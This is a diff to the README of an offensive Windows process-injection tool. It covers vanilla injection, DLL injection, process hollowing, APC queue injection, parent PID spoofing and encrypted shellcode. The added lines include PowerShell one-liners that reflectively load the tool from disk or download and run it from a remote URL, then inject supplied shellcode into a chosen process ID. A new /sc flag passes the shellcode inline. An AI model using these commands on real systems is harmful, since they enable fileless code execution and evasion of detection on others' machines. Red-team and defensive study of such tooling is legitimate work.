@@ -3,7 +3,7 @@
 ----
 
 The program is designed to perform process injection.
-Currently the tool supports 4 process injection techniques.
+Currently the tool supports 5 process injection techniques.
 
 ```
 1) Vanilla Process Injection
@@ -32,6 +32,19 @@ Encryption
 3) AES Encryption (It can also be used with Parent PID Spoofing technique but can't be used with DLL Injection Technique)
 ```
 
+Can be loaded via reflection.
+
+```
+# Load from the disk
+[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("ProcessInjection.exe"));
+
+# Load from a remote server
+[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://<URL>/ProcessInjection.exe"))
+
+# Perform process injection
+[ProcessInjection.ProcessInjection]::Main(@("/t:1", "/f:base64", "/pid:<ProcessId>", "/sc:<ShellCode>"))
+```
+
 ### Command Line Usage
 
 ```
@@ -42,18 +55,19 @@ Usage           Description
                 2 = DLL Injection
                 3 = Process Hollowing
                 4 = APC Queue Injection
-/f              Specify the format of the shellcode
+/f              Specify the format of the shellcode.
                 base64
                 hex
                 c
                 raw
-/pid            Specify the process id
-/parentproc     Specify the parent process name
-/path           Specify the path of the file that contains the shellcode
-/ppath          Specify the path of the executable that will be spawned (Mandatory while using /parentproc argument)
-/url            Specify the url where the shellcode is hosted
-/enc            Specify the encryption type (aes or xor) in which the shellcode is encrypted
+/pid            Specify the process id.
+/parentproc     Specify the parent process name.
+/path           Specify the path of the file that contains the shellcode.
+/ppath          Specify the path of the executable that will be spawned (Mandatory while using /parentproc argument).
+/url            Specify the url where the shellcode is hosted.
+/enc            Specify the encryption type (aes or xor) in which the shellcode is encrypted.
 /key            Specify the key that will be used to decrypt the shellcode.
+/sc             Specify the shellcode directly in base64 or hex format. Note: To pass large shellcode please leverage reflection to run the program.  
 /help           Show help
 ```
 
